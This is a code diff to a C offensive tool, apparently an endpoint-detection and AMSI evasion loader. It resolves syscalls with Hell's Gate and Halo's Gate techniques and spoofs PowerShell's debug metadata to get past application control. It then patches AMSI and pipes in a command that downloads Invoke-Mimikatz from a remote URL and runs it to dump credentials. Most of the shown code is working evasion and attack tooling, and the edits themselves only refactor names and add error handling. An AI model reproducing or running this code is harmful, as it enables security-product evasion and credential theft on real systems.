@@ -24,7 +24,7 @@ VOID Banner()
         "MMMKl;;;;;;;;cxXWWWKkd:;;;;;;;;;;;;;;;lK" NL
         "MMWk : ;;;;;;;;;;ckXWMMN0o:;;;;;;;;;;;;:xN" NC RED "                                     |" NL NC BLUE
         "MMKo;;;;;;;;;;;;;%sAuthor%sNOl;;;;;;;;;;;;c0M" NC RED "                ,------------=--------|___________|" NL NC BLUE
-        "MWk : ;;;;;;;;;;;;;;:%sAbdallah%s;;;;;;;;;;dNM" NC RED "-=============%%%|         |  |______|_|___________|" NL NC BLUE
+        "MWk : ;;;;;;;;;;;;;;:%sAbdallah%s;;;;;;;;;;dNM" NC RED "-=============%%%%%%|         |  |______|_|___________|" NL NC BLUE
         "MXo;;;;;;;;;;;;;:%sMohamed%sOd:;;;;;;;;;cOWM" NC RED "                 | | | | | | ||| | | | |___________|" NL NC BLUE
         "WOc;;;;;;;;;;:lxKNWNX0xl:;;;;;;;;;;;oXMM" NC RED "                 `------------=--------|           |" NL NC BLUE
         "Xd;;;;;;;;;cd0NWNKklc:;;;;;;;;;;;;;:kWMM" NC RED "                                       |" NL NC BLUE
@@ -56,6 +56,8 @@ VOID DeObfuscateAll()
     DeObfuscateData(g_cCopyFileA);
     DeObfuscateData(g_cDeleteFileA);
     DeObfuscateData(g_cSleep);
+    DeObfuscateData(g_cWaitForSingleObject);
+    DeObfuscateData(g_cResumeThread);
     DeObfuscateData(g_cASB);
     DeObfuscateData(g_cEEW);
 }
@@ -70,7 +72,7 @@ DWORD64 djb2(PBYTE str) {
     return dwHash;
 }
 
-VOID FindSyscall(PIMAGE pNtDLLImg, PSYSCALL_ENTRY pSyscall)
+VOID FindSyscall(PIMAGE pNtDLLImg, PSYSCALL_ENTRY pEntry)
 {
     PCHAR cFuncName;
     PBYTE pFuncAddr = NULL;    
@@ -81,10 +83,10 @@ VOID FindSyscall(PIMAGE pNtDLLImg, PSYSCALL_ENTRY pSyscall)
         cFuncName = (PCHAR)GETMODULEBASE(pNtDLLImg) + pNtDLLImg->pdwAddrOfNames[wIdx];
         pFuncAddr = (PBYTE)GETMODULEBASE(pNtDLLImg) + pNtDLLImg->pdwAddrOfFunctions[pNtDLLImg->pwAddrOfNameOrdinales[wIdx]];
 
-        if (djb2(cFuncName) != DeObfuscateHash(pSyscall->dwHash))
+        if (djb2(cFuncName) != DeObfuscateHash(pEntry->dwHash))
             continue;
 
-        if ((pSyscall->wSyscall = HellsGateGrabber((PVOID)pFuncAddr)) != 0)
+        if ((pEntry->wSyscall = HellsGateGrabber((PVOID)pFuncAddr)) != 0)
             return;
         
         break;
@@ -94,17 +96,17 @@ VOID FindSyscall(PIMAGE pNtDLLImg, PSYSCALL_ENTRY pSyscall)
     for (WORD idx = 1; idx < SYSCALLSCOUNT; idx++)
     {
         /* Go Down */
-        if ((pSyscall->wSyscall = HaloGateDown((PVOID)pFuncAddr, idx)) != 0)
+        if ((pEntry->wSyscall = HaloGateDown((PVOID)pFuncAddr, idx)) != 0)
             return;
 
         /* Go Up */
-        if ((pSyscall->wSyscall = HaloGateUp((PVOID)pFuncAddr, idx)) != 0)
+        if ((pEntry->wSyscall = HaloGateUp((PVOID)pFuncAddr, idx)) != 0)
             return;
     }
 
     /* Veles' Reek technique (in case all syscalls were hooked) 
     Calculate syscall number from its position between others syscalls */    
-    pSyscall->wSyscall = VelesReek(pNtDLLImg->pTextSection->SizeOfRawData, (PVOID)((DWORD_PTR)GETMODULEBASE(pNtDLLImg) + pNtDLLImg->pTextSection->PointerToRawData), pFuncAddr);
+    pEntry->wSyscall = VelesReek(pNtDLLImg->pTextSection->SizeOfRawData, (PVOID)((DWORD_PTR)GETMODULEBASE(pNtDLLImg) + pNtDLLImg->pTextSection->PointerToRawData), pFuncAddr);
 }
 
 VOID ResolveSyscalls(PIMAGE pNtDLLImg)
@@ -251,7 +253,9 @@ BOOL ResolveAPIs()
         (g_APIs.pTerminateProcess = (tTerminateProcess)GetProcAddress2(hModule, g_cTerminateProcess)) &&
         (g_APIs.pCopyFileA = (tCopyFileA)GetProcAddress2(hModule, g_cCopyFileA)) &&
         (g_APIs.pDeleteFileA = (tDeleteFileA)GetProcAddress2(hModule, g_cDeleteFileA)) &&
-        (g_APIs.pSleep = (tSleep)GetProcAddress2(hModule, g_cSleep))
+        (g_APIs.pSleep = (tSleep)GetProcAddress2(hModule, g_cSleep)) &&
+        (g_APIs.pWaitForSingleObject = (tWaitForSingleObject)GetProcAddress2(hModule, g_cWaitForSingleObject)) &&
+        (g_APIs.pResumeThread = (tResumeThread)GetProcAddress2(hModule, g_cResumeThread))
     );
 }
 
@@ -318,7 +322,7 @@ BOOL SpawnPowershell(PROCESS_INFORMATION *pi, STARTUPINFOEXA *si)
     
 
     /* 
-        Get the the size of the list to allocate memory for it, 
+        Get the size of the list to allocate memory for it, 
         Avoid ERROR_INSUFFICIENT_BUFFER, This occurs because the data area passed to a system call is too small
         But we are ok.
     */
@@ -346,7 +350,7 @@ BOOL SpawnPowershell(PROCESS_INFORMATION *pi, STARTUPINFOEXA *si)
     return TRUE;
 }
 
-PVOID ReadProcMemory(HANDLE hProc, PVOID pAddr, SIZE_T nSize)
+PVOID ReadProcessMemory2(HANDLE hProc, PVOID pAddr, SIZE_T nSize)
 {
     PVOID pData;
 
@@ -400,7 +404,7 @@ BOOL BypassApplicationControl(HANDLE hProc, LPVOID lpImgBaseAddr)
     PVOID pDbgRawDataAddr;
     
     /* Read image DOS header */
-    if (!(pDos = (PIMAGE_DOS_HEADER) ReadProcMemory(hProc, lpImgBaseAddr, sizeof(IMAGE_DOS_HEADER))))
+    if (!(pDos = (PIMAGE_DOS_HEADER)ReadProcessMemory2(hProc, lpImgBaseAddr, sizeof(IMAGE_DOS_HEADER))))
         return FALSE;
 
     /* Check on image magic number, to ensure if we read a valid image or not */
@@ -408,7 +412,7 @@ BOOL BypassApplicationControl(HANDLE hProc, LPVOID lpImgBaseAddr)
         return FALSE;
 
     /* Read image NT header */
-    if (!(pNt = (PIMAGE_NT_HEADERS)ReadProcMemory(hProc, (PVOID)((DWORD_PTR)lpImgBaseAddr + pDos->e_lfanew), sizeof(IMAGE_NT_HEADERS))))
+    if (!(pNt = (PIMAGE_NT_HEADERS)ReadProcessMemory2(hProc, (PVOID)((DWORD_PTR)lpImgBaseAddr + pDos->e_lfanew), sizeof(IMAGE_NT_HEADERS))))
         return FALSE;
 
     /* Check NT header signature */
@@ -419,7 +423,7 @@ BOOL BypassApplicationControl(HANDLE hProc, LPVOID lpImgBaseAddr)
     dbgDataDir = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG];
 
     /* Read DEBUG directory */
-    if (!(pDbg = (PIMAGE_DEBUG_DIRECTORY)ReadProcMemory(hProc, (PVOID)((DWORD_PTR)lpImgBaseAddr + dbgDataDir.VirtualAddress), dbgDataDir.Size)))
+    if (!(pDbg = (PIMAGE_DEBUG_DIRECTORY)ReadProcessMemory2(hProc, (PVOID)((DWORD_PTR)lpImgBaseAddr + dbgDataDir.VirtualAddress), dbgDataDir.Size)))
         return FALSE;
 
     /* Check the type of dir we read */
@@ -430,7 +434,7 @@ BOOL BypassApplicationControl(HANDLE hProc, LPVOID lpImgBaseAddr)
     pDbgRawDataAddr = (PVOID)((DWORD_PTR)lpImgBaseAddr + pDbg->AddressOfRawData);
 
     /* Read Debug data */
-    if (!(pPDB = (PPdbInfo)ReadProcMemory(hProc, pDbgRawDataAddr, sizeof(PdbInfo))))
+    if (!(pPDB = (PPdbInfo)ReadProcessMemory2(hProc, pDbgRawDataAddr, sizeof(PdbInfo))))
         return FALSE;
 
     /* Check Debug raw data signature */
@@ -441,7 +445,7 @@ BOOL BypassApplicationControl(HANDLE hProc, LPVOID lpImgBaseAddr)
     Helps EDR to detect powershell, so let's spoof it to bypass this kind of restrictions */
 
     return (
-        Patch(hProc, (PVOID)((DWORD_PTR)pDbgRawDataAddr + sizeof(PdbInfo) - 8), "\x50\x6f\x77\x72\x4c\x6f\x61\x64\x65\x72", 10) &&
+        Patch(hProc, (PVOID)((DWORD_PTR)pDbgRawDataAddr + sizeof(PdbInfo) - sizeof(pPDB->cPdbFileName)), "\x50\x6f\x77\x72\x4c\x6f\x61\x64\x65\x72", 10) &&
         Patch(hProc, (PVOID)((DWORD_PTR)pDbgRawDataAddr + 0x52), "\x50\x6f\x77\x72\x4c\x6f\x61\x64\x65\x72", 10)
     );
 }
@@ -584,10 +588,11 @@ INT main(INT argc, PCHAR *argv)
     else {
         PRINT_SUCCESS("Spoofed successfully");
     }
-
+    
     /* Read remote ntdll which still not hooked */
-    if (!(pFreshNtDLL = ReadProcMemory(pi.hProcess, hModule, pLocalNtDLLImg->dwSizeOfImage)))
+    if (!(pFreshNtDLL = ReadProcessMemory2(pi.hProcess, hModule, pLocalNtDLLImg->dwSizeOfImage)))
     {
+        PRINT_ERROR("Couldn't read a copy of ntdll from powershell process");
         nRet = EXIT_FAILURE;
         goto CLEANUP;
     }
@@ -601,14 +606,15 @@ INT main(INT argc, PCHAR *argv)
     }
 
     PRINT_STATUS("Resume execution of the powershell");
-    ResumeThread(pi.hThread);
+    g_APIs.pResumeThread(pi.hThread);
 
     PRINT_STATUS("Wait a few seconds to the process be ready");
     g_APIs.pSleep(10000);
 
     /* Read another ntdll copy after resume, maybe get hooked now */
-    if (!(pNtDLL2 = ReadProcMemory(pi.hProcess, hModule, pLocalNtDLLImg->dwSizeOfImage)))
+    if (!(pNtDLL2 = ReadProcessMemory2(pi.hProcess, hModule, pLocalNtDLLImg->dwSizeOfImage)))
     {
+        PRINT_ERROR("Couldn't read an another copy of ntdll from powershell process");
         nRet = EXIT_FAILURE;
         goto CLEANUP;
     }
@@ -667,7 +673,7 @@ INT main(INT argc, PCHAR *argv)
     PRINT_SUCCESS("AMSI patched successfully");
     WriteToPipe("IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BC-SECURITY/Empire/main/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1')\n", 172);
     WriteToPipe("Invoke-Mimikatz -Command coffee\n", 32);
-    WriteToPipe("exit\n", 5);
+    WriteToPipe("exit\n", 5); // Don't remove this instruction, it terminates the process
 
     PRINT_SUCCESS("Instructions injected, wait until be executed");
     PRINT_STATUS("OUTPUT :\n");
@@ -676,6 +682,8 @@ INT main(INT argc, PCHAR *argv)
     puts("--------------------------------------------------------------------------\n");
     PRINT_SUCCESS("Finish");
 
+    /* Wait until the process completely terminated */
+    g_APIs.pWaitForSingleObject(pi.hProcess, INFINITE);
 
 CLEANUP:
     PRINT_STATUS("Cleanup");
@@ -690,3 +698,4 @@ CLEANUP:
 
     return nRet;
 }
+
